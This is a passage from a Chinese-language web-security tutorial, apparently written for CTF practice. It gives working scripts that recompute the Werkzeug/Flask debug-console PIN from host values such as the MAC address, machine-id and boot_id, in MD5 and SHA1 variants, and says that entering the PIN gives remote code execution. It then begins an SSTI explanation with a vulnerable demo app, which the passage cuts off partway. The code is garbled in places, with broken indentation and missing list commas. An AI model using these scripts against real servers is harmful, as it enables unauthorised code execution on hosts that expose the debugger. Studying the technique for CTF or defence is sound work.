            # App Engine. It may also raise a KeyError if the UID does not
            # have a username, such as in Docker.
            username = getpass.getuser()
        except (ImportError, KeyError):
            username = None
        mod = sys.modules.get(modname)
        probably_public_bits = [
            username,
            modname,
            getattr(app, "__name__", type(app).__name__),
            getattr(mod, "__file__", None),
        ]
        private_bits = [str(uuid.getnode()), get_machine_id()]
        h = hashlib.sha1()
        for bit in chain(probably_public_bits, private_bits):
            if not bit:
                continue
            if isinstance(bit, str):
                bit = bit.encode("utf-8")
            h.update(bit)
        h.update(b"cookiesalt")
        cookie_name = f"__wzd{h.hexdigest()[:20]}"
        if num is None:
            h.update(b"pinsalt")
            num = f"{int(h.hexdigest(), 16):09d}"[:9]
        if rv is None:
            for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                    rv = "-".join(
                        num[x : x + group_size].rjust(group_size, "0")
                        for x in range(0, len(num), group_size)
                    )
                    break
            else:
                rv = num
        return rv, cookie_name
#### 生成算法：
将上面代码进行修改，就是生成PIN的算法代码：
> 其实最稳妥的方法就是自己调试，把自己版本的生成PIN部分提取出来，把num和rv改成None，直接print rv就行
>
> 这里注意3.6版本是md5加密，3.8版本是sha_1加密，我们在计算pin码时要注意抓包对应的Python版本  
>  ```python  
>  import hashlib  
>  from itertools import chain  
>  probably_public_bits = [
>
> # 1\. username
>  
>  
>     'root',
>
> # 2\. modname
>  
>  
>     'flask.app',
>
> # 3\. appname：getattr(app, ' **name** ', getattr(app. **class** , ' **name**
> '))
>  
>  
>     'Flask',
>
> # 4\. moddirgetattr(mod, ' **file** ', None)
>  
>  
>     '/usr/local/lib/python3.7/site-packages/flask/app.py',
>
> ]
private_bits = [
# 5\. uuidnode：str(uuid.getnode()), /sys/class/net/ens33/address
    '2485377957890',
# 6\. Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id +
/proc/self/cgroup
    '861c92e8075982bcac4a021de9795f6e3291673c8c872ca3936bcaa8a071948b'
]
h = hashlib.sha1()  
for bit in chain(probably_public_bits, private_bits):  
if not bit:  
continue  
if isinstance(bit, str):  
bit = bit.encode("utf-8")  
h.update(bit)  
h.update(b"cookiesalt")
cookie_name = f"__wzd{h.hexdigest()[:20]}"
# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None  
if num is None:  
h.update(b"pinsalt")  
num = f"{int(h.hexdigest(), 16):09d}"[:9]
# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv = None  
if rv is None:  
for group_size in 5, 4, 3:  
if len(num) % group_size == 0:  
rv = "-".join(  
num[x: x + group_size].rjust(group_size, "0")  
for x in range(0, len(num), group_size)  
)  
break  
else:  
rv = num  
print(rv)
    3.6-md5加密：
    ```python
    #MD5
    import hashlib
    from itertools import chain
    probably_public_bits = [
         'flaskweb'
         'flask.app',
         'Flask',
         '/usr/local/lib/python3.7/site-packages/flask/app.py'
    ]
    private_bits = [
         '25214234362297',
         '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'
    ]
    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    cookie_name = '__wzd' + h.hexdigest()[:20]
    num = None
    if num is None:
       h.update(b'pinsalt')
       num = ('%09d' % int(h.hexdigest(), 16))[:9]
    rv =None
    if rv is None:
       for group_size in 5, 4, 3:
           if len(num) % group_size == 0:
              rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
              break
           else:
              rv = num
    print(rv)
3.8-SHA1加密：
    #sha1-web801
    import hashlib
    from itertools import chain
    probably_public_bits = [
        'root'
        'flask.app',
        'Flask',
        '/usr/local/lib/python3.8/site-packages/flask/app.py'
    ]
    private_bits = [
        '2485377581757',
        'ab5474dd-e22b-45df-8316-7ad4e11f978a1cb8b52e9e47a792613d0b114b4042af7ffe0172d17e6a4189afb4ae637430eb'
    ]
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    cookie_name = '__wzd' + h.hexdigest()[:20]
    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]
    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num
    print(rv)
    //109-133-029
#### 开启控制台：
在右边框打开python交互shell控制台，需要输入pin码，然后开启python交互shell控制台，我们就可以进行RCE了
## Flask框架漏洞:
### 漏洞成因：
  * 如果flask代码不严谨，可能造成任意文件读取和RCE
  * 最主要的漏洞成因是因为渲染模板时，没有严格控制对用户的输入，或使用了危险模板，导致用户可以和flask程序进行交互，从而造成漏洞的产生，flask漏洞也被称为SSTI
  * flask是基于python开发的一种web服务器，也就说明如果用户可以和flask进行交互的话，就可以执行python的代码，比如eval，system，file之类的函数
### 漏洞演示：
下面是演示一个看起来没问题的代码，请把目光移至html_str中的标签，其中str是被{{}}包括起来的，也就是说，使用{{}}包起来的，是会被预先渲染转义，然后才输出的，不会被渲染执行
    from importlib.resources import contents
    import time
    from flask import Flask,request,redirect,url_for,render_template_string,render_template
    app = Flask(__name__)
    @app.route('/',methods = ['GET'])
    def index():
        str = request.args.get('v')
        html_str = '''
            {{str}}